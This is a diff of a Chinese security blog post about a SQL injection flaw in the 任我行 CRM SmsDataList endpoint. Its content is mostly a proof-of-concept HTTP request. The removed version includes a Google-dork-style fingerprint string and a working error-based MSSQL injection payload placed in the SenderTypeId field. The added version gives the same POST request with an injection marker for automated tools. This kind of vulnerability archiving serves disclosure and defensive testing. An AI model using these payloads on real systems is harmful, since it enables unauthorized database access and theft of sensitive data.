@@ -5,7 +5,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <title>任我行 CRM SmsDataList SQL注入漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="任我行 CRM SmsDataList SQL注入漏洞" />
-<meta property="og:description" content="任我行 CRM SmsDataList SQL注入漏洞 漏洞描述 任我行CRM系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管" />
+<meta property="og:description" content="任我行 CRM SmsDataList SQL注入漏洞 1 2 3 4 5 6 7 8 9 10 POST /SMS/SmsDataList/?pageIndex=1&amp;pageSize=30 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 170 Keywords=&amp;StartSendDate=2020-06-17&amp;EndSendDate=2020-09-17&amp;SenderTypeId=00000000*" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
@@ -15,12 +15,12 @@
 <meta name="twitter:image" content="http://example.org/logo.png"/>
 
 <meta name="twitter:title" content="任我行 CRM SmsDataList SQL注入漏洞"/>
-<meta name="twitter:description" content="任我行 CRM SmsDataList SQL注入漏洞 漏洞描述 任我行CRM系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管"/>
+<meta name="twitter:description" content="任我行 CRM SmsDataList SQL注入漏洞 1 2 3 4 5 6 7 8 9 10 POST /SMS/SmsDataList/?pageIndex=1&amp;pageSize=30 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 170 Keywords=&amp;StartSendDate=2020-06-17&amp;EndSendDate=2020-09-17&amp;SenderTypeId=00000000*"/>
 <meta name="twitter:site" content="@xxxx"/>
 <meta name="application-name" content="Chinchin&#39;s blog">
 <meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/" /><link rel="next" href="http://example.org/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -29,7 +29,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/example.org\/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/"
-        },"genre": "posts","keywords": "漏洞知识库","wordcount":  182 ,
+        },"genre": "posts","keywords": "2023hw漏洞","wordcount":  50 ,
         "url": "http:\/\/example.org\/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,8 +104,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">任我行 CRM SmsDataList SQL注入漏洞</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;182 words&nbsp;
+</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;50 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="true">
                 <div class="details-summary toc-title">
@@ -114,56 +114,37 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#漏洞描述">漏洞描述</a></li>
-    <li><a href="#漏洞影响">漏洞影响</a></li>
-    <li><a href="#网络测绘">网络测绘</a></li>
-    <li><a href="#漏洞复现">漏洞复现</a></li>
+    <li><a href="#任我行-crm-smsdatalist-sql注入漏洞">任我行 CRM SmsDataList SQL注入漏洞</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="任我行-crm-smsdatalist-sql注入漏洞">任我行 CRM SmsDataList SQL注入漏洞</h1>
-<h2 id="漏洞描述">漏洞描述</h2>
-<p><em>任我行CRM</em>系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。</p>
-<p>任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息。</p>
-<h2 id="漏洞影响">漏洞影响</h2>
-<p>任我行 CRM</p>
-<h2 id="网络测绘">网络测绘</h2>
-<p>&ldquo;欢迎使用任我行CRM&rdquo;</p>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p>登陆页面</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="images/image-20230828150050416.png"
-        data-srcset="images/image-20230828150050416.png, images/image-20230828150050416.png 1.5x, images/image-20230828150050416.png 2x"
-        data-sizes="auto"
-        alt="images/image-20230828150050416.png"
-        title="image-20230828150050416" /></p>
-<p>验证POC</p>
+            </div><div class="content" id="content"><h2 id="任我行-crm-smsdatalist-sql注入漏洞">任我行 CRM SmsDataList SQL注入漏洞</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span><span class="n">SMS</span><span class="o">/</span><span class="n">SmsDataList</span><span class="o">/</span><span class="err">?</span><span class="n">pageIndex</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">pageSize</span><span class="o">=</span><span class="mi">30</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
-</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
-</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> 
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /SMS/SmsDataList/?pageIndex=1&amp;pageSize=30 HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 170
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">Keywords</span><span class="o">=&amp;</span><span class="n">StartSendDate</span><span class="o">=</span><span class="mi">2020</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">17</span><span class="o">&amp;</span><span class="n">EndSendDate</span><span class="o">=</span><span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">17</span><span class="o">&amp;</span><span class="n">SenderTypeId</span><span class="o">=</span><span class="mi">0000000000</span><span class="s1">&#39; and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES(&#39;</span><span class="n">MD5</span><span class="s1">&#39;,&#39;</span><span class="mi">123456</span><span class="s1">&#39;)))) AND &#39;</span><span class="n">CvNI</span><span class="s1">&#39;=&#39;</span><span class="n">CvNI</span>
+</span></span><span class="line"><span class="cl">Keywords=&amp;StartSendDate=2020-06-17&amp;EndSendDate=2020-09-17&amp;SenderTypeId=00000000*
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="images/image-20230828150106754.png"
-        data-srcset="images/image-20230828150106754.png, images/image-20230828150106754.png 1.5x, images/image-20230828150106754.png 2x"
-        data-sizes="auto"
-        alt="images/image-20230828150106754.png"
-        title="image-20230828150106754" /></p>
-</div><div class="post-footer" id="post-footer">
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -174,20 +155,20 @@
                             <a class="link-to-markdown" href="/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞" data-via="xxxx" data-hashtags="2023hw漏洞"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-hashtag="2023hw漏洞"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-title="任我行 CRM SmsDataList SQL注入漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/%E4%BB%BB%E6%88%91%E8%A1%8C-%E7%AE%A1%E5%AE%B6%E5%A9%86-%E8%AE%A2%E8%B4%A7%E6%98%93%E5%9C%A8%E7%BA%BF%E5%95%86%E5%9F%8E-selectimage.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="任我行 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>任我行 管家婆 订货易在线商城 SelectImage.aspx 任意文件上传漏洞</a>
-            <a href="/%E4%BB%BB%E6%88%91%E8%A1%8C-crm-smsdatalist-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="任我行 CRM SmsDataList SQL注入漏洞">任我行 CRM SmsDataList SQL注入漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/%E4%BB%BB%E6%88%91%E8%A1%8Ccrm-smsdatalist-sql%E6%B3%A8%E5%85%A5/" class="prev" rel="prev" title="任我行CRM SmsDataList SQL注入"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>任我行CRM SmsDataList SQL注入</a>
+            <a href="/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%B9%B3%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="亿赛通电子文档平台文件上传漏洞">亿赛通电子文档平台文件上传漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
